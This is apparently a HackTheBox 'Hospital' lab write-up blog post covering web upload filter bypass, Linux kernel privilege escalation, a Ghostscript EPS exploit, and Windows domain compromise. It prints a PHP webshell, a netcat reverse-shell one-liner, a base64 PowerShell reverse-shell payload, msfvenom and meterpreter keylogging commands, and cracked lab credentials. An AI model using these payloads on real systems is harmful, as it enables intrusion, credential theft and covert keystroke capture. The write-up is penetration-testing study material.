@@ -1,0 +1,697 @@
+---
+layout: post
+title: "HTB: Hospital"
+---
+### Recon
+
+**nmap:**
+
+```
+# Nmap 7.95 scan initiated Tue Jul 29 22:51:10 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN hospital.nmap 10.10.11.241
+Nmap scan report for 10.10.11.241
+Host is up (0.025s latency).
+Not shown: 979 filtered tcp ports (no-response)
+PORT     STATE SERVICE           VERSION
+22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
+|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-07-30 09:51:20Z)
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+1801/tcp open  msmq?
+2103/tcp open  msrpc             Microsoft Windows RPC
+2105/tcp open  msrpc             Microsoft Windows RPC
+2107/tcp open  msrpc             Microsoft Windows RPC
+2179/tcp open  vmrdp?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+3269/tcp open  globalcatLDAPssl?
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+3389/tcp open  ms-wbt-server     Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: HOSPITAL
+|   NetBIOS_Domain_Name: HOSPITAL
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: hospital.htb
+|   DNS_Computer_Name: DC.hospital.htb
+|   DNS_Tree_Name: hospital.htb
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-07-30T09:52:10+00:00
+| ssl-cert: Subject: commonName=DC.hospital.htb
+| Not valid before: 2025-07-29T09:44:00
+|_Not valid after:  2026-01-28T09:44:00
+5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.55 (Ubuntu)
+| http-title: Login
+|_Requested resource was login.php
+Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-30T09:52:12
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Jul 29 22:52:51 2025 -- 1 IP address (1 host up) scanned in 101.35 seconds
+
+```
+
+There's a few key details here.
+
+- In the SSH banner, it indicates an Ubuntu machine but the Active Directory ports indicate a Windows box. Clearly, some type of Docker or virtualization technology is in use.
+- Speaking of, this is an Active Directory machine. Good to have a heightened ear to usernames here.
+- There is an HTTPS and HTTP port present, indicating websites that could be great places to start hunting for a vulnerability.
+
+I'll start with enumerating the HTTPS website.
+
+**Web (443):**
+
+![Roundcube Webmail](https://cybersec.deadandbeef.com/images/Hospital/image-20250729232703100.png)
+
+A Roundcube Webmail instance is hosted here. The software doesn't have too many vulnerabilities worth looking at, so we'll put it to the side unless we have nowhere else to go. I will scan for subdomains on this port though.
+
+```
+└─$ ffuf -u https://hospital.htb -H 'Host: FUZZ.hospital.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 5322
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://hospital.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.hospital.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 5322
+________________________________________________
+
+:: Progress: [293/19966] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
+```
+
+The scan goes very slowly, and to me, isn't worth my time unless I'm grasping at straws and have tried everything else.
+
+**Web (8080):**
+
+![custom hospital site](https://cybersec.deadandbeef.com/images/Hospital/image-20250729233834220.png)
+
+This website looks much more interesting. We don't have credentials, but can make an account. Also worth noting is that this is a PHP website.
+
+![logged in](https://cybersec.deadandbeef.com/images/Hospital/image-20250729234114079.png)
+
+After logging in, we see an upload page. Lots of exploit potential here, but let's first observe what happens when uploading a simple image.
+
+![upload succeeds](https://cybersec.deadandbeef.com/images/Hospital/image-20250729234749433.png)
+
+A simple upload success page. Makes me wonder where our image actually went. More fuzzing is warranted here, perhaps an upload directory is present?
+
+```
+└─$ ffuf -u http://hospital.htb:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 403
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://hospital.htb:8080/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 403
+________________________________________________
+
+images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 28ms]
+js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 28ms]
+css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 38ms]
+uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 25ms]
+.                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
+fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 24ms]
+vendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 22ms]
+:: Progress: [43007/43007] :: Job [1/1] :: 1492 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
+```
+
+Indeed there is an uploads directory! We don't have a directory listing, but we can try looking for our file with its original name. Maybe it doesn't change?
+
+![trying for filenames](https://cybersec.deadandbeef.com/images/Hospital/image-20250730001025991.png)
+
+It's there with its original filename intact. There's probably a file upload vulnerability present, the question is just about execution.
+
+### Exploitation
+
+#### Shell as www-data on webserver
+
+First of all, let's try uploading simple php code to the server with an image file extension to see if a MIME type filter is present.
+
+```
+└─$ curl http://hospital.htb:8080/uploads/damn.jpg                               
+<?php system($_GET['cmd']); ?>
+```
+
+It does upload, but doesn't execute as PHP code. Now let's try adding on the php extension.
+
+![Failed Upload](https://cybersec.deadandbeef.com/images/Hospital/image-20250730003602513.png)
+
+It doesn't succeed, but there are other file extensions we could try to bypass the filter if a blacklist is present. Hacktricks has a great [page](https://hacktricks.boitatech.com.br/pentesting-web/file-upload) about file upload vulnerabilities, and we can fuzz for those alternate PHP extensions.
+
+Using Burp to save the upload request to a file, we can input that to FFUF to observe the results.
+
+```
+└─$ ffuf -r -request site.req -w exts -request-proto http                                                                                                   
+                                                                                                                                                            
+        /'___\  /'___\           /'___\                                                                                                                     
+       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                     
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                    
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                    
+         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                     
+          \/_/    \/_/   \/___/    \/_/                                                                                                                     
+                                                                                                                                                            
+       v2.1.0-dev                                                                                                                                           
+________________________________________________                                                                                                            
+                                                                                                                                                            
+ :: Method           : POST                                                                                                                                 
+ :: URL              : http://hospital.htb:8080/upload.php                                                                                                  
+ :: Wordlist         : FUZZ: /home/kali/boxes/Hospital/exts                                                                                                 
+ :: Header           : Host: hospital.htb:8080                                                                                                              
+ :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8                                                              
+ :: Header           : Origin: http://hospital.htb:8080                                                                                                     
+ :: Header           : Connection: keep-alive                                                                                                               
+ :: Header           : Referer: http://hospital.htb:8080/index.php                                                                                          
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0                                                   
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Header           : Accept-Encoding: gzip, deflate, br
+ :: Header           : Content-Type: multipart/form-data; boundary=---------------------------25989387414265776840864018545
+ :: Header           : Cookie: PHPSESSID=lh5nk2mmt3011nm9g3vvbck3kt
+ :: Header           : Priority: u=0, i 
+ :: Data             : -----------------------------25989387414265776840864018545
+Content-Disposition: form-data; name="image"; filename="damn.jpg.FUZZ"
+Content-Type: image/jpeg
+
+<?php system($_GET['cmd']); ?>
+
+-----------------------------25989387414265776840864018545--
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ ________________________________________________
+php6                    [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 23ms]
+php3                    [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 23ms]
+php7                    [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 25ms]
+phps                    [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 30ms]
+php2                    [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 24ms]
+pgif                    [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 24ms]
+php4                    [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 43ms]
+pht                     [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 81ms]
+php5                    [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 82ms]
+shtml                   [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 82ms]
+inc                     [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 80ms]
+htaccess                [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 84ms]
+phps                    [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 26ms]
+phtml                   [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 39ms]
+phtm                    [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 28ms]
+phar                    [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 47ms]
+:: Progress: [16/16] :: Job [1/1] :: 3 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+```
+
+Since a size of 3508 indicates a failed upload, we'll filter on size 3508. This leaves just phps, pht, phtm, pgif, shtml, phar, htaccess, and inc as valid extensions.  Testing each of them, they all return the raw PHP content without execution except for phar and phps. The latter returns a 403 Forbidden, but phar returns nothing. To check for basic execution, we'll have a simple print statement that should output "hospital."
+
+![Executed PHP](https://cybersec.deadandbeef.com/images/Hospital/image-20250730021029743.png)
+
+It does indeed execute! But since our previous webshell didn't work, there may be some restrictions on the PHP functions we can use. If phpinfo isn't restricted, we can check for this.
+
+It turns out that phpinfo is not disabled, and the following functions are disabled:
+
+```
+pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,shell_exec,exec,proc_open,preg_replace,passthru,curl_exec
+```
+
+Lots of execution functions are unavailable to us, but popen isn't on the list. Therefore, we can use that to gain RCE. We can try to get a reverse shell next, and the following payload gets us that.
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.9 4444 >/tmp/f
+```
+
+Importantly, when we look at the output of `ip addr`, this is clearly not the main machine.
+
+```
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:15:5d:00:8a:02 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.5.2/24 brd 192.168.5.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::215:5dff:fe00:8a02/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+The IP of 192.168.5.2 doesn't match the public-facing address of 10.10.11.241, so it's worth looking for what virtualization or container technology is in use.
+
+#### Privilege Escalation on webserver
+
+Running the command `systemd-detect-virt`, we get the output of `microsoft`, indicating Hyper-V. So there's no docker exploitation to try here.
+
+We do find a credential for the database in the `config.php` file though:
+
+```php
+<?php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'root');
+define('DB_PASSWORD', 'my$qls3rv1c3!');
+define('DB_NAME', 'hospital');
+ 
+/* Attempt to connect to MySQL database */
+$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
+ 
+// Check connection
+if($link === false){
+    die("ERROR: Could not connect. " . mysqli_connect_error());
+}
+?>
+```
+
+With our MySQL access, we obtain two password hashes:
+
+```
+admin:$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2
+patient:$2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO
+```
+
+After putting these into hashcat, the admin hash cracks to "123456" and the patient hash cracks to "patient"
+
+Looking for other users on the box, there's only one listed in the passwd file that can be logged into (which isn't root):
+
+```
+root:x:0:0:root:/root:/bin/bash                                 
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:106::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
+pollinate:x:101:1::/var/cache/pollinate:/bin/false
+sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:103:109::/nonexistent:/usr/sbin/nologin
+uuidd:x:104:110::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:105:111::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+Neither of these collected passwords work to log in as either drwilliams or root. There's not much else on the machine other than the web application that we can access as www-data. Perhaps the kernel can help us?
+
+```
+Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+Researching this kernel version, we find a nftables [exploit](https://github.com/synacktiv/CVE-2023-35001) that leads to privilege escalation. Let's try it out on webserver.
+
+Compiling and transferring the exploit to the target, we execute it and observe what occurs.
+
+```
+www-data@webserver:/tmp$ ./exploit 
+[+] Using config: 5.19.0-35-generic
+[+] Recovering module base
+[+] Module base: 0xffffffffc077b000
+[+] Recovering kernel base
+[+] Kernel base: 0xffffffff9ea00000
+[+] Got root !!!
+#
+```
+
+We indeed get root on the system, and can see what else is there for us to collect post-exploitation.
+
+There's not much in the root folder, but we do have some additional password hashes in /etc/shadow, and can try to crack them.
+
+```
+$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD
+$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/
+```
+
+These first one didn't crack due to being an unsupported hash, and the second one cracks to the following:
+
+```
+qwe123!@#
+```
+
+This is the password for the drwilliams user, and now it's time to go back to the front-facing Active Directory parts of the machine. Perhaps these credentials work?
+
+### User Shell on Hospital
+
+Trying out the credentials on SMB returns a success!
+
+```
+└─$ smbclient -U drwilliams -L //dc.hospital.htb
+Password for [WORKGROUP\drwilliams]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to dc.hospital.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+```
+
+There's not much to check out on SMB though, and drwilliams is not allowed to log in via RDP. We did put Roundcube to the side earlier though, and it's worth a try now with credentials.
+
+![Logged In Roundcube](https://cybersec.deadandbeef.com/images/Hospital/image-20250730091539896.png)
+
+Now we can log into Roundcube, and there seems to be an email for drwilliams. Let's see what it says:
+
+```
+Dear Lucy,
+
+I wanted to remind you that the project for lighter, cheaper and
+environmentally friendly needles is still ongoing 💉. You are the one in
+charge of providing me with the designs for these so that I can take
+them to the 3D printing department and start producing them right away.
+Please make the design in an ".eps" file format so that it can be well
+visualized with GhostScript.
+
+Best regards,
+Chris Brown.
+😃
+```
+
+We need to send an attachment to drbrown, and it will be executed using Ghostscript. This is likely the way forward, so we need to look for Ghostscript vulnerabilities, specifically dealing with eps files.
+
+Searching for exploits leads us to CVE-2023-36664, a command injection vulnerability that can be exploited using eps files. A repo with a poc exists [here](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection), and we can assemble the exploit for drbrown with the following command.
+
+```
+└─$ python3 CVE_2023_36664_exploit.py --revshell -ip 10.10.16.9 -port 4444 -x eps -g
+[+] Generated EPS payload file: malicious.eps
+```
+
+We'll change it to final.eps (for the realism) and send it to drbrown, starting our listener before. It doesn't happen, because by default, it executes a Linux command. A mistake, but we can fix it by inserting a Windows payload. We all make mistakes!
+
+```
+└─$ python3 CVE_2023_36664_exploit.py --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" -ip 10.10.16.9 -port 4444 -x eps -g
+```
+
+We wait for a few seconds, and get a reverse shell as drbrown!
+
+```
+└─$ nc -lnvp 4444                                                                  
+listening on [any] 4444 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.11.241] 6212
+
+PS C:\Users\drbrown.HOSPITAL\Documents> whoami
+hospital\drbrown
+```
+
+Heading to the desktop, we find the user.txt file!
+
+```
+PS C:\Users\drbrown.HOSPITAL\Desktop> type user.txt
+68e4eb23d405b0a5808098b21467290f
+```
+
+### Privilege Escalation on Hospital
+
+There's four different ways to get administrator access on the system, and I'll show each. As an important note, we do find drbrown's password in his Documents directory, within the file `ghostscript.bat`:
+
+```bat
+@echo off
+set filename=%~1
+powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
+```
+
+
+
+#### Via Roundcube
+
+I wouldn't expect this, but privilege escalation can be obtained through the webmail instance! Dropping a webshell in the main directory of Roundcube, we see this when running `whoami`:
+
+![Roundcube Exec](https://cybersec.deadandbeef.com/images/Hospital/image-20250730103216671.png)
+
+We're running as SYSTEM!
+
+#### Via RDP
+
+It's worth checking if drbrown can log in via RDP. And he can:
+
+![RDP screenshot](https://cybersec.deadandbeef.com/images/Hospital/image-20250730111630716.png)
+
+We see a password typed in, and using inspect element, it can be revealed. Doing so reveals it:
+
+```
+Th3B3stH0sp1t4l9786!
+```
+
+Testing it against SMB:
+
+```
+└─$ smbclient -U Administrator -L //dc.hospital.htb
+Password for [WORKGROUP\Administrator]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to dc.hospital.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+```
+
+It works for Administrator login! We can WinRM or psexec from here to gain a shell on Hospital.
+
+#### Via Keystroke Logging
+
+We'll need meterpreter for this, so let's generate a payload and execute it as drbrown:
+
+```
+└─$ msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST=10.10.16.9 LPORT=4444 -f exe -o rev.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: rev.exe
+```
+
+Uploading it to the box via WinRM and executing it gets us a meterpreter shell. But how would we even know to capture keystrokes in the first place?
+
+We start off by loading the espia extension, which allows us to screengrab:
+
+```
+meterpreter > load espia
+Loading extension espia...Success.
+meterpreter > screengrab
+[-] espia_image_get_dev_screen: Operation failed: The handle is invalid.
+```
+
+... or not. We may not be in an interactive process though, so let's check for another process that is:
+
+![processes](https://cybersec.deadandbeef.com/images/Hospital/image-20250730114727259.png)
+
+explorer.exe seems like a good bet to migrate to. It does form the desktop after all. Running screengrab now brings us this image:
+
+![Roundcube Screenshot](https://cybersec.deadandbeef.com/images/Hospital/image-20250730114922210.png)
+
+We see the obscured password. What if someone is typing it in? Meterpreter has keyscan modules for this, so let's make use of them!
+
+```
+meterpreter > keyscan_start
+Starting the keystroke sniffer ...
+```
+
+After waiting for a few minutes, let's check it:
+
+```
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+Admini
+
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+stratorTh3B3s
+
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+tH0sp1t4l
+
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+9786!
+```
+
+Putting the password part together, it makes the administrator password:
+
+```
+Th3B3stH0sp1t4l9786!
+```
+
+As before, WinRM or psexec can be used to log into the system.
+
+#### Script Enumeration
+
+In the System32 directory, there exist a few vbs files, one being non-default:
+
+```
+*Evil-WinRM* PS C:\Windows\System32> dir | findstr vbs                                                                                                      
+-a----        9/15/2018  12:13 AM           4119 CallUxxProvider.vbs                                                                                        
+-a----        9/15/2018  12:12 AM          88781 gatherNetworkInfo.vbs                                                                                      
+-a----        9/15/2018  12:12 AM         142904 slmgr.vbs                                                                                                  
+-a----        9/15/2018   2:11 AM           1005 SyncAppvPublicationServer.vbs                                                                              
+-a----        9/15/2018  12:13 AM           1720 SyncAppvPublishingServer.vbs                                                                               
+-a----        11/5/2022  11:58 AM         136192 vbsapi.dll                                                                                                 
+-a----        11/5/2022  12:00 PM         596992 vbscript.dll                                                                                               
+-a----        9/15/2018  12:12 AM         204105 winrm.vbs
+```
+
+It's hard to know to look for this in the first place, but it is a publicly viewable file. In SyncAppvPublicationServer.vbs exists the following content:
+
+```
+from selenium import webdriver                                                                                                                              
+from selenium.webdriver.support.ui import WebDriverWait                                                                                                     
